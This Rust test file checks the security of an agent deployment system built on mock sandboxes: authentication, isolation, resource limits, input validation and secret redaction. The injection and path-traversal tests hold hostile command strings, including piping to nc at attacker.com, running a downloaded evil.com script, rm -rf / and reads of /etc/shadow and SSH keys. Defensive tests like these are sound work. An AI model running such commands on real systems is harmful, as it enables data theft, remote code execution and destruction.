//! Security Tests for Agent Deployment System
//!
//! Tests security aspects:
//! 1. Authentication and authorization
//! 2. Sandbox isolation
//! 3. Resource limits and quotas
//! 4. API key protection
//! 5. Input validation and sanitization

use serde_json::json;

mod fixtures;
use fixtures::*;

// ============================================================================
// Security Tests - Authentication & Authorization
// ============================================================================

#[tokio::test]
async fn test_authentication_required() {
    let system = MockAgentSystem::new().await.unwrap();

    // Attempt deployment without authentication
    let result = system.deploy_agent_unauthenticated(AgentConfig::default()).await;

    assert!(result.is_err());
    assert!(result.unwrap_err().to_string().contains("unauthorized") ||
            result.unwrap_err().to_string().contains("authentication"));
}

#[tokio::test]
async fn test_invalid_api_key_rejection() {
    let invalid_keys = vec![
        "",
        "invalid",
        "wrong-api-key",
        "Bearer fake-token",
    ];

    for key in invalid_keys {
        let client = MockE2BClient::new(key);

        let result = client.create_sandbox(SandboxConfig::default()).await;

        assert!(result.is_err(), "Invalid key '{}' should be rejected", key);
    }
}

#[tokio::test]
async fn test_resource_ownership_enforcement() {
    let system = MockAgentSystem::new().await.unwrap();

    // User 1 deploys agent
    let deployment = system.deploy_agent_for_user(
        "user-1",
        AgentConfig {
            name: "user1-agent".to_string(),
            ..Default::default()
        }
    ).await.unwrap();

    // User 2 attempts to access user 1's agent
    let result = system.get_agent_status_for_user(
        "user-2",
        &deployment.agent_id
    ).await;

    assert!(result.is_err());
    assert!(result.unwrap_err().to_string().contains("forbidden") ||
            result.unwrap_err().to_string().contains("permission"));
}

#[tokio::test]
async fn test_admin_access_privileges() {
    let system = MockAgentSystem::new().await.unwrap();

    // Regular user deploys agent
    let deployment = system.deploy_agent_for_user(
        "user-1",
        AgentConfig::default()
    ).await.unwrap();

    // Admin should be able to access any agent
    let result = system.get_agent_status_for_user(
        "admin",
        &deployment.agent_id
    ).await;

    assert!(result.is_ok());
}

#[tokio::test]
async fn test_api_key_rotation() {
    let original_key = "original-api-key";
    let new_key = "rotated-api-key";

    let mut client = MockE2BClient::new(original_key);

    // Create sandbox with original key
    let sandbox = client.create_sandbox(SandboxConfig::default()).await.unwrap();

    // Rotate key
    client.rotate_api_key(new_key);

    // Original operations should still work for existing resources
    let status = client.get_sandbox_status(&sandbox.sandbox_id).await;
    assert!(status.is_ok());

    // New operations should use new key
    let new_sandbox = client.create_sandbox(SandboxConfig::default()).await;
    assert!(new_sandbox.is_ok());
}

// ============================================================================
// Security Tests - Sandbox Isolation
// ============================================================================

#[tokio::test]
async fn test_sandbox_filesystem_isolation() {
    let client = MockE2BClient::new("test-key");

    let sandbox1 = client.create_sandbox(SandboxConfig::default()).await.unwrap();
    let sandbox2 = client.create_sandbox(SandboxConfig::default()).await.unwrap();

    // Write file in sandbox1
    client.upload_file(&sandbox1.sandbox_id, "/app/secret.txt", b"secret data").await.unwrap();

    // Try to read from sandbox2
    let result = client.read_file(&sandbox2.sandbox_id, "/app/secret.txt").await;

    assert!(result.is_err(), "Sandbox filesystem should be isolated");
}

#[tokio::test]
async fn test_sandbox_network_isolation() {
    let client = MockE2BClient::new("test-key");

    let sandbox = client.create_sandbox(SandboxConfig {
        network_mode: NetworkMode::Isolated,
        ..Default::default()
    }).await.unwrap();

    // Attempt to access external network
    let result = client.execute_command(
        &sandbox.sandbox_id,
        "curl https://example.com",
        None
    ).await;

    // Should fail due to network isolation
    assert!(result.is_ok()); // Command executes
    let output = result.unwrap();
    assert_ne!(output.exit_code, 0); // But fails
}

#[tokio::test]
async fn test_sandbox_process_isolation() {
    let client = MockE2BClient::new("test-key");

    let sandbox = client.create_sandbox(SandboxConfig::default()).await.unwrap();

    // Try to access host processes
    let result = client.execute_command(
        &sandbox.sandbox_id,
        "ps aux | grep -v sandbox",
        None
    ).await.unwrap();

    // Should only see sandbox processes, not host processes
    assert!(!result.stdout.contains("systemd"));
    assert!(!result.stdout.contains("dockerd"));
}

#[tokio::test]
async fn test_sandbox_privilege_restrictions() {
    let client = MockE2BClient::new("test-key");

    let sandbox = client.create_sandbox(SandboxConfig::default()).await.unwrap();

    // Attempt privileged operations
    let privileged_commands = vec![
        "sudo su",
        "chmod 4755 /bin/bash",
        "mount /dev/sda1 /mnt",
        "iptables -F",
    ];

    for cmd in privileged_commands {
        let result = client.execute_command(&sandbox.sandbox_id, cmd, None).await;

        assert!(result.is_ok());
        let output = result.unwrap();
        assert_ne!(output.exit_code, 0, "Privileged command '{}' should fail", cmd);
    }
}

// ============================================================================
// Security Tests - Resource Limits
// ============================================================================

#[tokio::test]
async fn test_memory_limit_enforcement() {
    let client = MockE2BClient::new("test-key");

    let sandbox = client.create_sandbox(SandboxConfig {
        max_memory_mb: 256,
        ..Default::default()
    }).await.unwrap();

    // Try to allocate more memory than limit
    let result = client.execute_command(
        &sandbox.sandbox_id,
        "node -e 'const arr = new Array(300 * 1024 * 1024);'",
        None
    ).await;

    // Should be killed or fail due to OOM
    assert!(result.is_ok());
    let output = result.unwrap();
    assert_ne!(output.exit_code, 0);
}

#[tokio::test]
async fn test_cpu_limit_enforcement() {
    let client = MockE2BClient::new("test-key");

    let sandbox = client.create_sandbox(SandboxConfig {
        max_cpu_percent: 50.0,
        ..Default::default()
    }).await.unwrap();

    // Start CPU-intensive process
    client.execute_command(
        &sandbox.sandbox_id,
        "while true; do :; done &",
        None
    ).await.unwrap();

    tokio::time::sleep(tokio::time::Duration::from_secs(2)).await;

    // Check CPU usage
    let health = client.get_sandbox_health(&sandbox.sandbox_id).await.unwrap();
    assert!(health.cpu_usage <= 50.0, "CPU usage should be limited");
}

#[tokio::test]
async fn test_disk_quota_enforcement() {
    let client = MockE2BClient::new("test-key");

    let sandbox = client.create_sandbox(SandboxConfig {
        max_disk_mb: 100,
        ..Default::default()
    }).await.unwrap();

    // Try to write more than quota
    let result = client.execute_command(
        &sandbox.sandbox_id,
        "dd if=/dev/zero of=/tmp/large_file bs=1M count=150",
        None
    ).await;

    assert!(result.is_ok());
    let output = result.unwrap();
    assert_ne!(output.exit_code, 0, "Disk quota should be enforced");
}

#[tokio::test]
async fn test_concurrent_agent_limit() {
    let system = MockAgentSystem::new().await.unwrap();

    let max_agents = MockAgentSystem::MAX_CONCURRENT_AGENTS;

    let mut deployments = Vec::new();

    // Deploy up to limit
    for i in 0..max_agents {
        let config = AgentConfig {
            name: format!("limit-test-{}", i),
            ..Default::default()
        };

        let deployment = system.deploy_agent(config).await;
        assert!(deployment.is_ok());
        deployments.push(deployment.unwrap());
    }

    // Attempt to exceed limit
    let over_limit = system.deploy_agent(AgentConfig {
        name: "over-limit".to_string(),
        ..Default::default()
    }).await;

    assert!(over_limit.is_err());
    assert!(over_limit.unwrap_err().to_string().contains("limit"));
}

// ============================================================================
// Security Tests - Input Validation
// ============================================================================

#[tokio::test]
async fn test_agent_name_validation() {
    let system = MockAgentSystem::new().await.unwrap();

    let invalid_names = vec![
        "",
        " ",
        "name with spaces",
        "name/with/slashes",
        "name<with>tags",
        "'; DROP TABLE agents; --",
        "../../../etc/passwd",
        "a".repeat(300), // Too long
    ];

    for name in invalid_names {
        let config = AgentConfig {
            name: name.to_string(),
            ..Default::default()
        };

        let result = system.deploy_agent(config).await;
        assert!(result.is_err(), "Invalid name '{}' should be rejected", name);
    }
}

#[tokio::test]
async fn test_command_injection_prevention() {
    let client = MockE2BClient::new("test-key");
    let sandbox = client.create_sandbox(SandboxConfig::default()).await.unwrap();

    let malicious_commands = vec![
        "echo test; rm -rf /",
        "test && cat /etc/passwd",
        "test | nc attacker.com 4444",
        "$(curl http://evil.com/malware.sh | bash)",
        "`wget http://evil.com/backdoor`",
    ];

    for cmd in malicious_commands {
        // System should sanitize or reject
        let result = client.execute_command(&sandbox.sandbox_id, cmd, None).await;

        if result.is_ok() {
            let output = result.unwrap();
            // Command may execute but shouldn't succeed with injection
            assert!(!output.stdout.contains("root:"));
            assert!(!output.stdout.contains("/etc/passwd"));
        }
    }
}

#[tokio::test]
async fn test_path_traversal_prevention() {
    let client = MockE2BClient::new("test-key");
    let sandbox = client.create_sandbox(SandboxConfig::default()).await.unwrap();

    let malicious_paths = vec![
        "../../../etc/passwd",
        "/etc/shadow",
        "../../.ssh/id_rsa",
        "/proc/self/environ",
    ];

    for path in malicious_paths {
        let result = client.read_file(&sandbox.sandbox_id, path).await;

        assert!(result.is_err(), "Path traversal '{}' should be blocked", path);
    }
}

#[tokio::test]
async fn test_environment_variable_sanitization() {
    let system = MockAgentSystem::new().await.unwrap();

    let malicious_env_vars = vec![
        ("LD_PRELOAD", "/tmp/malicious.so"),
        ("PATH", "/tmp/malicious:/usr/bin"),
        ("BASH_ENV", "/tmp/malicious.sh"),
    ];

    for (key, value) in malicious_env_vars {
        let config = AgentConfig {
            name: "env-test".to_string(),
            env_vars: vec![(key.to_string(), value.to_string())],
            ..Default::default()
        };

        let result = system.deploy_agent(config).await;

        // Should either reject or sanitize dangerous env vars
        if result.is_ok() {
            let deployment = result.unwrap();

            // Verify env var was sanitized or not set
            let status = system.get_agent_status(&deployment.agent_id).await.unwrap();

            // Check that dangerous env vars aren't actually set
            assert!(!status.metadata.get("env_vars").unwrap_or(&json!({}))
                .as_object().unwrap()
                .contains_key(key));
        }
    }
}

// ============================================================================
// Security Tests - API Key Protection
// ============================================================================

#[tokio::test]
async fn test_api_keys_not_logged() {
    let system = MockAgentSystem::new().await.unwrap();

    let config = AgentConfig {
        name: "api-key-test".to_string(),
        env_vars: vec![
            ("API_KEY".to_string(), "secret-key-12345".to_string()),
            ("OPENROUTER_KEY".to_string(), "sk-or-v1-abc123".to_string()),
        ],
        ..Default::default()
    };

    let deployment = system.deploy_agent(config).await.unwrap();

    // Get logs
    let logs = system.get_agent_logs(&deployment.agent_id, 100).await.unwrap();

    // Verify API keys are redacted in logs
    for log in logs {
        assert!(!log.message.contains("secret-key-12345"));
        assert!(!log.message.contains("sk-or-v1-abc123"));

        // Should show redacted version
        if log.message.contains("API_KEY") {
            assert!(log.message.contains("***"));
        }
    }
}

#[tokio::test]
async fn test_api_keys_encrypted_at_rest() {
    let system = MockAgentSystem::new().await.unwrap();

    let config = AgentConfig {
        name: "encryption-test".to_string(),
        env_vars: vec![
            ("SECRET_KEY".to_string(), "my-secret-value".to_string()),
        ],
        ..Default::default()
    };

    let deployment = system.deploy_agent(config).await.unwrap();

    // Check database storage
    let db_record = system.get_deployment_from_db(&deployment.agent_id).await.unwrap();

    // API keys should be encrypted in database
    let env_vars_json = db_record.env_vars_json.unwrap();
    assert!(!env_vars_json.contains("my-secret-value"));
    assert!(env_vars_json.contains("encrypted:") || env_vars_json.contains("***"));
}

// ============================================================================
// Security Tests - Secure Communication
// ============================================================================

#[tokio::test]
async fn test_tls_required_for_api() {
    let app = create_test_app().await;

    // Attempt HTTP connection (should be redirected or rejected)
    let response = app.get_insecure("http://localhost:3000/api/agents")
        .send()
        .await;

    // Should either fail or redirect to HTTPS
    assert!(response.is_err() || response.unwrap().status().is_redirection());
}

#[tokio::test]
async fn test_rate_limiting() {
    let app = create_test_app().await;

    let rapid_requests = 100;

    let mut responses = Vec::new();

    for _ in 0..rapid_requests {
        let response = app.get("/api/agents")
            .send()
            .await
            .unwrap();

        responses.push(response.status());
    }

    // Should hit rate limit
    assert!(responses.iter().any(|s| *s == StatusCode::TOO_MANY_REQUESTS));
}

#[tokio::test]
async fn test_request_size_limits() {
    let app = create_test_app().await;

    // Attempt to upload very large file
    let huge_content = "A".repeat(100 * 1024 * 1024); // 100MB

    let response = app.put("/api/agents/test/files")
        .json(&json!({
            "path": "/app/huge.txt",
            "content": huge_content
        }))
        .send()
        .await
        .unwrap();

    assert_eq!(response.status(), StatusCode::PAYLOAD_TOO_LARGE);
}

// ============================================================================
// Security Tests - Audit Logging
// ============================================================================

#[tokio::test]
async fn test_security_event_logging() {
    let system = MockAgentSystem::new().await.unwrap();

    // Trigger security-relevant events
    let _ = system.deploy_agent_unauthenticated(AgentConfig::default()).await;

    // Check audit logs
    let audit_logs = system.get_audit_logs(100).await.unwrap();

    assert!(!audit_logs.is_empty());
    assert!(audit_logs.iter().any(|log|
        log.event_type == "unauthorized_access"
    ));
}

#[tokio::test]
async fn test_failed_authentication_tracking() {
    let system = MockAgentSystem::new().await.unwrap();

    let invalid_tokens = vec!["bad1", "bad2", "bad3"];

    for token in invalid_tokens {
        let _ = system.authenticate_with_token(token).await;
    }

    // Get security logs for failed auth attempts
    let failed_auths = system.get_failed_auth_attempts("unknown-user", 10).await.unwrap();

    assert!(failed_auths.len() >= 3);
}

// ============================================================================
// Security Tests - Data Protection
// ============================================================================

#[tokio::test]
async fn test_sensitive_data_redaction() {
    let system = MockAgentSystem::new().await.unwrap();

    let task = AgentTask {
        task_id: "sensitive-task".to_string(),
        task_type: "test".to_string(),
        prompt: "Process credit card: 4532-1234-5678-9010".to_string(),
        ..Default::default()
    };

    let deployment = system.deploy_agent(AgentConfig::default()).await.unwrap();
    system.execute_task(&deployment.agent_id, task).await.unwrap();

    // Check logs for PII redaction
    let logs = system.get_agent_logs(&deployment.agent_id, 100).await.unwrap();

    for log in logs {
        // Credit card numbers should be redacted
        assert!(!log.message.contains("4532-1234-5678-9010"));
        assert!(!log.message.contains("4532123456789010"));
    }
}

#[tokio::test]
async fn test_agent_data_isolation() {
    let system = MockAgentSystem::new().await.unwrap();

    let agent1 = system.deploy_agent(AgentConfig {
        name: "agent-1".to_string(),
        ..Default::default()
    }).await.unwrap();

    let agent2 = system.deploy_agent(AgentConfig {
        name: "agent-2".to_string(),
        ..Default::default()
    }).await.unwrap();

    // Agent 1 stores data
    let task1 = AgentTask {
        task_id: "store-data".to_string(),
        task_type: "test".to_string(),
        prompt: "Remember: secret data XYZ123".to_string(),
        ..Default::default()
    };

    system.execute_task(&agent1.agent_id, task1).await.unwrap();

    // Agent 2 tries to access agent 1's data
    let task2 = AgentTask {
        task_id: "access-data".to_string(),
        task_type: "test".to_string(),
        prompt: "What did the other agent remember?".to_string(),
        ..Default::default()
    };

    let result = system.execute_task(&agent2.agent_id, task2).await.unwrap();

    // Agent 2 should not have access to agent 1's data
    assert!(!result.output.contains("XYZ123"));
}
